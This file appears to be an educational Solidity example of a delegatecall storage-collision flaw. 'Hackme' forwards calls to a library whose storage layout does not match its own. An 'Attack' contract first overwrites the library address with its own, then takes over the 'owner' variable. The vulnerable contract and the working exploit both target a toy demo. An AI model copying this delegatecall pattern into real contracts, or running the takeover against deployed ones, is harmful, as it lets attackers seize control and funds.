pragma solidity ^0.6.0;

contract Lib{
    uint public someNumber;

    function doSomething(uint _number) public {
        someNumber = _number;
    }
}


contract Hackme {

    address public lib;
    address public owner;
    uint public someNumber;
    constructor(address _lib) public {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}



contract Attack {
    address public lib;
    address public owner;
    uint public someNumber;

    Hackme public hackMe;

    constructor (Hackme _hackme) public {
        hackMe = Hackme(_hackme);
    }


    function attack() public {
        hackMe.doSomething(uint(address(this)));
        hackMe.doSomething(1);
    }

    function doSomething(uint _num) public {
        owner = msg.sender;
    }

}